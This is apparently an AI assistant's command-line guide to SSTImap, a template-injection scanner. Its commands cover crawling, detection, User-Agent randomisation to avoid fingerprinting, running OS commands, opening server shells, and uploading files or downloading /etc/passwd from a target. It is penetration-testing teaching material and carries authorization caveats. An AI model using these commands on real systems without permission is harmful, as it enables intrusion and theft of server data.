# 1) Basic single-URL detection (fast)

Good when you just want a quick check on one URL.

```bash
# simple detection (non-interactive)
python sstimap.py -u "https://example.com/page?name=test" --run
```

What it does: runs detection with default payloads and reports if an injection point is found.

---

# 2) Load many URLs from file (`urls.txt`)

One URL per line in `urls.txt`.

```bash
python sstimap.py --load-urls urls.txt
# or interactive + run immediately
python sstimap.py --load-urls urls.txt -i --run
```

Use when scanning a list of targets (again: authorized only).

---

# 3) Interactive mode — explore & exploit manually

Interactive is safer for controlled exploitation and lets you abort (Ctrl+C) while experimenting.

```bash
# open interactive prompt with initial URL and automatically run detection
python sstimap.py -u "http://localhost:5000/page?name=test" -i --run
```

Inside interactive mode you can change settings (url, marker, engine) and type `run` again.

---

# 4) Crawl site + forms discovery

Useful when you don’t have a list of endpoints.

```bash
python sstimap.py -u "https://example.com" -c 2 -f --save-urls crawled-urls.txt --save-forms crawled-forms.txt
```

Options explained:

* `-c 2` — crawl depth 2
* `-f` — scan pages for forms
* `--save-urls`/`--save-forms` — export discovered items

---

# 5) Use random User-Agent and delay to reduce fingerprinting

```bash
python sstimap.py -u "https://example.com/page?name=test" -A --delay 1
```

`-A` = random desktop UA on each request; `--delay 1` adds 1 second between requests.

---

# 6) Target specific template engine or techniques

Narrowing engines reduces false positives / speeds tests.

```bash
# only Jinja2, only rendered+error techniques
python sstimap.py -u "http://target/?name=foo" -e Jinja2 -r RE
```

Engines: look at the help (e.g., `Jinja2`, `Twig`, `Smarty`, etc.). Techniques: R=Rendered, E=Error, B=Boolean blind, T=Time blind.

---

# 7) Logging responses and SSL verification

```bash
# Enable logging to ~/.sstimap/sstimap.log and verify SSL certs
python sstimap.py -u "https://example.com/?name=1" --log-response --verify-ssl
```

---

# 8) Basic exploitation — eval and OS commands (only on targets you control)

If a target is vulnerable and you’re authorized, these give interactive shells:

```bash
# run a single OS command
python sstimap.py -u "http://vuln/?name=test" -S "id"

# start an interactive OS shell (prompt)
python sstimap.py -u "http://vuln/?name=test" -s

# evaluate a template-base language command (e.g. Python eval on Jinja2)
python sstimap.py -u "http://vuln/?name=test" -X ".__import__('os').listdir('.')"
```

**Be careful** with `-s`, `-S`, `-X`, `-x`, and `-t` — they execute code on the server.

---

# 9) Upload / download files (authorized lab only)

```bash
# upload local.txt to /tmp/remote.txt on target
python sstimap.py -u "http://vuln/?name=test" -U local.txt /tmp/remote.txt

# download /etc/passwd (only on VMs you control)
python sstimap.py -u "http://vuln/?name=test" -D /etc/passwd ./passwd.copy
```

`-F` forces overwrite when uploading.

---

# 10) Proxying traffic (useful with Burp or for capture)

```bash
python sstimap.py -u "http://target/?name=1" -p http://127.0.0.1:8080
```

Point `-p` at Burp (or any HTTP proxy) to inspect requests.

---

# Handy combinations for pentest workflow

1. Crawl → save URLs:

```bash
python sstimap.py -u "https://example.com" -c 2 -f --save-urls urls.txt --save-forms forms.txt
```

2. Triage saved URLs:

```bash
python sstimap.py --load-urls urls.txt -i --run
```

3. If vuln detected → interact:

```bash
# start interactive shell on engine
python sstimap.py -u "http://vuln/?name=1" -i
# then use `--os-shell` or `--eval-shell` as needed interactively
```

---

# Notes / troubleshooting

* If `--load-forms` fails, post a sample of the file contents and I’ll show the exact formatting SSTImap expects.
* If pip complains about dependencies, run `pip install -r requirements.txt` within the virtualenv.
* Use `--verify-blind-delay` and `--blind-delay` if you suspect time-based blind injection and want to tune delays.
* `--no-color` useful when redirecting output to files.
